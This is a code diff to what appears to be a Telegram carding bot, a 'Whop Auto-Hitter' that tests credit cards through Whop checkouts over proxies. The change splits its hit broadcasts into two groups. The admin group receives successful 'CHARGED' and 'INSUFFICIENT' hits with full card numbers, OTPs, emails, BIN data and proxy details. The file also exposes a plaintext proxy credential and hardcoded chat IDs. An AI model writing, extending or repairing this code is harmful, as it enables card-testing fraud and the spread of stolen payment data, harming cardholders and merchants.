@@ -44,6 +44,9 @@ from database import (
     get_premium_status,
 )
 
+# `sub.get_hitter_status` does not exist in this build.
+# `database.get_premium_status` returns (bool, Optional[datetime])
+# which is exactly what the rest of this file expects.
 get_hitter_status = get_premium_status
 
 try:
@@ -89,19 +92,28 @@ user_last_command_time = {}
 ADMIN_IDS = {6962534443, 8428369446}
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# BROADCAST — single group.
-# Receives ONLY:
+# BROADCAST CONFIG
+#
+# Both groups receive ONLY:
 #   • CHARGED cards 💎     (order placed successfully)
 #   • INSUFFICIENT cards 💰 (insufficient funds)
 #
-# Full details are sent: header + Whop URL + every field of the
-# standard card result block (CC, gate, response, plan, email, OTP,
-# proxy, BIN info, time, user, dev).
-#
-# Declined / 3DS / incorrect-CVC / errors are NOT broadcast.
+# Declined / 3DS / incorrect-CVC / errors are NEVER broadcast.
 # They appear only in the user's private /whop reply.
+#
+# ── CHARGED_GROUP_CHAT_ID (admin)   → FULL details
+#      header + Whop URL + CC + gate + response + plan +
+#      email + OTP + proxy + all BIN fields + time + user + dev
+#
+# ── SUMMARY_GROUP_CHAT_ID (summary) → SHORT version
+#      header (with WHOP) + gate + response + plan + user
+#      (NO CC, NO URL, NO BIN, NO email, NO OTP, NO proxy, NO time, NO dev)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 CHARGED_GROUP_CHAT_ID = -1004437051761
+
+# ⚠️ Replace the placeholder below with your summary group's real chat ID.
+#    Must start with -100. The bot must be a member with Send Messages.
+SUMMARY_GROUP_CHAT_ID = -1004479507133  # ← REPLACE
 
 DEFAULT_ADMIN_PROXIES = [
     "http://1351:IBd1Fk5CuUNZ@p103.squidproxies.com:9087",
@@ -449,17 +461,23 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
                     except Exception:
                         pass
 
-        # ── Broadcast — SINGLE group, CHARGED + INSUFFICIENT only ──
-        # Full details: header + Whop URL + every field from final_caption
+        # ── Broadcast — TWO groups, CHARGED + INSUFFICIENT only ──
+        #   1. CHARGED_GROUP_CHAT_ID (admin)   → FULL details
+        #   2. SUMMARY_GROUP_CHAT_ID (summary) → SHORT version, no CC
         if is_charged or is_insufficient:
             if is_charged:
-                header = "<b>💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 𝗛𝗜𝗧 💎</b>"
+                header         = "<b>💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 𝗛𝗜𝗧 💎</b>"
+                summary_header = "<b>💎 𝗪𝗛𝗢𝗣 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 𝗛𝗜𝗧 💎</b>"
+                badge          = "CHARGED"
             else:
-                header = "<b>💰 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗛𝗜𝗧 💰</b>"
+                header         = "<b>💰 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗛𝗜𝗧 💰</b>"
+                summary_header = "<b>💰 𝗪𝗛𝗢𝗣 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗛𝗜𝗧 💰</b>"
+                badge          = "INSUFFICIENT"
 
+            # ── 1. Admin group — FULL details ──
             url_line = f"<b>🔗 𝗪𝗵𝗼𝗽 𝗨𝗥𝗟:</b> <code>{html.escape(whop_url)}</code>\n"
 
-            broadcast_text = (
+            full_text = (
                 f"{header}\n"
                 f"━━━━━━━━━━━━━━━━\n"
                 f"{url_line}"
@@ -471,12 +489,33 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
                 await safe_send_message(
                     message.bot,
                     chat_id=CHARGED_GROUP_CHAT_ID,
-                    text=broadcast_text,
+                    text=full_text,
                     parse_mode="HTML",
                     reply_markup=reply_markup,
                 )
             except Exception as e:
-                logging.error(f"Whop broadcast → CHARGED_GROUP_CHAT_ID failed: {e}")
+                logging.error(f"Whop broadcast → CHARGED_GROUP_CHAT_ID (full) failed: {e}")
+
+            # ── 2. Summary group — SHORT version (no CC, no URL, no BIN/email/OTP) ──
+            short_text = (
+                f"{summary_header}\n"
+                f"<b>🌐 𝗚𝗮𝘁𝗲:</b> 𝗪𝗵𝗼𝗽 𝗔𝘂𝘁𝗼-𝗛𝗶𝘁𝘁𝗲𝗿\n"
+                f"━━━━━━━━━━━━━━━━\n"
+                f"<b>💬 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:</b> {html.escape(str(res_message or badge))}\n"
+                f"<b>📦 𝗣𝗹𝗮𝗻:</b> <code>{html.escape(str(plan_id))}</code>\n"
+                f"<b>👤 𝗨𝘀𝗲𝗿:</b> {user_display}"
+            )
+
+            try:
+                await safe_send_message(
+                    message.bot,
+                    chat_id=SUMMARY_GROUP_CHAT_ID,
+                    text=short_text,
+                    parse_mode="HTML",
+                    reply_markup=reply_markup,
+                )
+            except Exception as e:
+                logging.error(f"Whop broadcast → SUMMARY_GROUP_CHAT_ID (short) failed: {e}")
 
     except Exception as fatal_err:
         logging.error(f"Fatal unhandled exception in process_whop_check: {fatal_err}", exc_info=True)
